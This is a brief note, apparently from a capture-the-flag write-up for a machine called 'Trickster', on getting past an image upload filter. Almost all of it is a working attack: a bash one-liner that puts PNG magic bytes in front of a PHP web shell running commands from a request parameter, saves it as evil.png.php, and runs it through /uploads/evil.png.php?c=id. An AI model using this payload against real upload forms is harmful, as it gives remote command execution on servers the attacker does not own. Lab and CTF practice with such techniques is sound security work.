# Trickster 

Bypass upload PNG 
Create a new file PNG using magic bytes to generate psp web shell
```bash
echo -ne '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_REQUEST["c"]);?>' > evil.png.php
```

Upload `evil.png.php` and access it from `/uploads/evil.png.php?c=id`